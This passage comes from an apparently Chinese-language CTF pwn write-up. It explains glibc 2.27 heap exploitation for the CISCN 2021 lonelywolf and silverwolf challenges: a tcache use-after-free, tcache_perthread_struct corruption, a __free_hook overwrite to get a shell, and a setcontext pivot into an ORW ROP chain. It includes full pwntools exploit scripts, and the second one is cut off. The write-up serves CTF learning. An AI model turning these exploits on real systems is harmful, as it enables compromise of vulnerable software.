add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>size1<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">,</span>content1<span class="token operator">=</span><span class="token string">b'bbb'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>size1<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">,</span>content1<span class="token operator">=</span><span class="token string">b'bbb'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>size1<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaa'</span><span class="token punctuation">,</span>content1<span class="token operator">=</span><span class="token string">b'bbb'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
fake_chunk <span class="token operator">=</span> <span class="token number">0x602098</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>size1<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">,</span>content1<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeaf</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>size1<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'1'</span><span class="token punctuation">,</span>content1<span class="token operator">=</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
<span class="token comment">#后一个不能是0x50因为这时候fastbin里还有残留，但不是正常的chunk形式，不能申请出来</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">,</span>size1<span class="token operator">=</span><span class="token number">0x60</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'f'</span><span class="token punctuation">,</span>content1<span class="token operator">=</span><span class="token string">b'a'</span><span class="token punctuation">)</span>



show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token comment"># delete(index=0)</span>

<span class="token comment"># pause()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="4-NSSCTF-CISCN-2021-初赛-lonelywolf-tcache-uaf-amp-tcache-perthread-struct"><a href="#4-NSSCTF-CISCN-2021-初赛-lonelywolf-tcache-uaf-amp-tcache-perthread-struct" class="headerlink" title="4.NSSCTF  CISCN 2021 初赛 lonelywolf(tcache uaf &amp; tcache_perthread_struct)"></a>4.NSSCTF  CISCN 2021 初赛 lonelywolf(tcache uaf &amp; tcache_perthread_struct)</h2><p>到最后没打通远程，好像是libc版本不对的问题，因为NSS没给libc，但无伤大雅，差不多懂了，更重要的是下一道silverwolf，但这道题还是学了些东西，记录一下：</p>
<p> 2.27保护全开，看着是道菜单题，delete存在uaf，但是有一些不一样，只能控制最后添加的chunk，所以有一些小变化</p>
<p><img src="https://picx.zhimg.com/80/v2-62badec67735bf28efe626ad5a41d5e1_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-ca0ab6229578c05818a8b7fa342cf991_1440w.png" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-8f62163958b4a75e67ceaa9d76dc55da_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-807aa44601923aa12a9dc220b1c091f5_1440w.png" alt="img"></p>
<p>可以看到就是得利用uaf。因为只能控制最后一个申请的chunk，所以我们首先用一次uaf将堆地址泄露出来，这里因为用的2.27版本比较新，所以会有key的存在，通过edit将key清零。</p>
<p><img src="https://pica.zhimg.com/80/v2-88d85810658cafccceb55b94dc3ef32c_1440w.png" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-ade0e92cc89b94de2ba1d00f0b2e119d_1440w.png" alt="img"></p>
<p>接下来就该泄露libc地址了，那这道题该怎么用呢，需要用到tcache_perthread_struct，也就是这里前面这个0x250的chunk，这里 tcache_perthread_struct中保存了各个大小的tcache的list中的元素多少，以及各个大小的tcache的首个chunk的地址，也是就entries 指针,这道题就是这样做的，因为我们泄露得到了堆地址，所以我们可以寻址到tcache_perthread_struct,通过edit来修改现在0x80的tcachebins的地址，指向 tcache_perthread_struct，再申请两次，将其申请出来，我们就可以对他进行更改了。</p>
<p><img src="https://picx.zhimg.com/80/v2-25c75f5e46ee047d829116e6664e7bc0_1440w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-bda0716fbf467301721324b60af3be76_1440w.png" alt="img"></p>
<p> 那要改什么东西呢，我们注意看，这里的0x02代表着当前0x80大小的tcachebin链中有两个元素，而当前这个chunk的大小为0x250，我们将0x250处修改为7，代表0x250的链是满的，再将这个chunk free，就会进入unsortbin中了，从而泄露libc。</p>
<p><img src="https://pic1.zhimg.com/80/v2-9ac68336932f6a245c7345d09ed6e4f9_1440w.png" alt="img"></p>
<p>泄露libc后该怎么利用呢，可以打freehook，怎么打就要利用到entries了注意看这里红框标注的地方，就是0x80的entries指针了，所以我们现在依然可以修改这个0x250的chunk，让他的0x30处的entries直接指向freehook，再add一次，就可以写system，就可以getshell了。</p>
<p><img src="https://pica.zhimg.com/80/v2-9082e86703afe576286db08f2db5a7b9_1440w.png" alt="img"></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28755</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice: '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>
add_size_words <span class="token operator">=</span> <span class="token string">'Size: '</span>
add_content_words <span class="token operator">=</span> <span class="token string">''</span>

menu_del <span class="token operator">=</span> <span class="token number">4</span>
del_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">2</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'Content: '</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token comment"># debug()</span>


add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>
heap_address <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x260</span>
leak_info<span class="token punctuation">(</span><span class="token string">'heap_base'</span><span class="token punctuation">,</span>heap_address<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>heap_address<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">)</span>
<span class="token comment">#大小为0x250的堆块头被add</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x78</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x23</span><span class="token operator">+</span><span class="token string">b'\x07'</span><span class="token punctuation">)</span>
<span class="token comment">#进入unsortbin</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
show<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ebca0</span>
free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc.address'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'free_hook'</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x3ebca0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>payload<span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x28</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">0x38</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 远程没打通，很烦，但不想搞了，就这样吧</p>
<h2 id="5-NSS-CISCN-2021-初赛-silverwolf（setcontext，uaf，double-free）"><a href="#5-NSS-CISCN-2021-初赛-silverwolf（setcontext，uaf，double-free）" class="headerlink" title="5.NSS [CISCN 2021 初赛]silverwolf（setcontext，uaf，double free）"></a>5.NSS [CISCN 2021 初赛]silverwolf（setcontext，uaf，double free）</h2><p>和lonelywolf不同的是加了沙箱，不能再getshell了，所以需要要打ord，而对于堆上的orw就需要用到setcontext了，这是一个存在于libc中的函数，而在其中有一段代码也就是setcontext+53开始，图上的红圈开始，会使用rdi（高版本是rdx）来给其他寄存器赋值，在2.27时，我们如果控制了rdi，就可以控制到rsp（当然，也可以给其他寄存器赋值），从而把栈迁移到我们想要的地方去，从而执行我们自己的rop链。这道题目就是经典的2.27下的打setcontext，记录一下，学习一下，好像还可以直接用pwntools里的SigreturnFrame直接来写到setcontext这里，但暂时不太会，后面再看一下。 </p>
<p><img src="/images/v2-18b043665faa14ee6eb888158d53ed7e_720w.png" alt="img"></p>
<p>来看题目，题目和上一道lonelywolf没有什么区别，只是加了沙箱，所以源码就不放了，只是这道题有堆风水问题，所以需要稍微注意一下。和lonelywolf一样，首先还是需要泄露堆基址和libc地址。这是最开始时的堆风水，为了好做double free，我们先申请7个0x78的chunk，清空这个大小的tcachebins再开始。</p>
<p><img src="/images/v2-cef71d5132bc967c04b09847d8820591_720w.png" alt="img"></p>
<p>到泄露libc和freehook还是一样的</p>
<p><img src="/images/v2-e9bf2841b43a663e1bb151d5d16f66d4_720w.png" alt="img"></p>
<p>接下来就是这道题目不一样的地方了，沙箱是白名单，只允许orw，所以我们就需要使用setcontext的打法了，接下来还是对tcache_perthread_struct的操作，之前在这一步，我们是直接修改每个tcachebin list里含有的元素多少以及修改entries指针直接指向free_hook，再直接将free_hook申请出来修改为system。</p>
<p>在这里，同样的，我们会将free_hook申请出来，但不会修改为system，而是修改为setcontext+0x53，这样如果我们后续给rdi合适的值，就可以通过mov rsp,[rdi+0A0]，给rsp赋值，从而达到栈迁移的目的。那么接下来的问题就是我们该如何构造 ，让rsp有一个合适的值。</p>
<p>我们的选择是将栈迁移到我们能控制的堆上来，那我们该怎么控制呢，别忘了我们的tcache_perthread_struct，我们可以修改entries，让不同大小的tcachebin链的首元素都是我们自己控制的堆块。注意看下面的payload，我们0x20大小的entries指向的是free_hook，而后面从0x30到0x80大小的指向的都是我们直接控制的，为什么是heap_base加这么多，首先因为这道题的堆风水，所以我写的大一点，只要构造的合适，写多少都可以，只要在堆空间上。在这里heap_base+0x1000用于存放’/flag’ 字符串（用于open）和我们想要的flag（read和write）。heap_base+0x2000用于作为rdi被free，而free被覆盖为setcontext+53，这就是我们给rdi设置好的值了 ，heap_base+20a0， 还记得吗，我们是通过<strong>mov rsp,[rdi+0A0]给rsp赋值的</strong>，所以我们需要在这里<strong>存入一个要给rsp的值，也就是接下来的</strong>heap_base+0x3000，这里存放的就是我们的rop链了，因为rop链的长度有点长（0x70大小，其实这个chunk只能存下0x60，但我申请的是0x68，不知道为啥），所以我们需要另一个chunk， 存储没存完的rop，也就是heap_base+0x3060 ，刚好和之前的接上。这就是整个利用过程了</p>
<p><img src="/images/v2-7001fb1d5068ffc37672d758d7be95c4_720w.png" alt="img"></p>
<p> 整个利用链就是这样，接下来就是写rop了：</p>
<p><img src="/images/v2-8756e247791b5348ce68dec53d51abdb_720w.png" alt="img"></p>
<p>不知道为什么open用的syscall，而read和write不用，看别人是这样写的，不管了，反正rop的问题不大。</p>
<p>接下来就是利用了，先覆盖free_hook，/flag存储在heapbase+0x1000,再将rop存在heapbase+0x3000和heapbase+0x3060上，在add一个大小为0x58的chunk，就取到了heapbase+0x20a0，在这里写入我们要让rsp迁移到的地方，也就是heapbase+0x3000，加一个ret，让setcontext里的push rcx不破坏栈结构，再add一个size=0x48的chunk，取到了heapbase+0x2000，将其free，就成功调用了setcontext！就会执行我们的rop了，最后就能拿到flag了</p>
<p><img src="/images/v2-15c19f7b3dd7b573cb4ca3c345808c50_720w.png" alt="img"></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.anna.nssctf.cn'</span><span class="token punctuation">,</span><span class="token number">28408</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice: '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>
add_size_words <span class="token operator">=</span> <span class="token string">'Size: '</span>
add_content_words <span class="token operator">=</span> <span class="token string">''</span>

menu_del <span class="token operator">=</span> <span class="token number">4</span>
del_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">2</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'Content: '</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
